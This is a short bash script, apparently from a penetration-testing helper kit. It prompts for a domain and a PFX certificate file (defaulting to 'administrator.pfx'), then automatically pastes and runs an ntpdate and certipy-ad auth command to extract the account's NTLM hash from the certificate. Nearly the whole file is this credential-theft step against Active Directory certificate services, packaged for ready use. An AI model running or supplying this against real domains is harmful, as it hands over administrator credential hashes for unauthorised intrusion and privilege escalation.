#!/bin/bash

: '
get hash with pfx file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
DOMAIN_FIELD=$(form_item "domain" "domain")
PFX_FILE_FIELD=$(form_item "pfx file" "pfx_file" "administrator.pfx")

# Generate GUI form
generate_form "${DOMAIN_FIELD}" "${PFX_FILE_FIELD}"

DOMAIN=${form_data["domain"]}
PFX_FILE=${form_data["pfx_file"]}

paste_command "sudo ntpdate -s ${DOMAIN} && certipy-ad auth -pfx ${PFX_FILE}"
xdotool key Return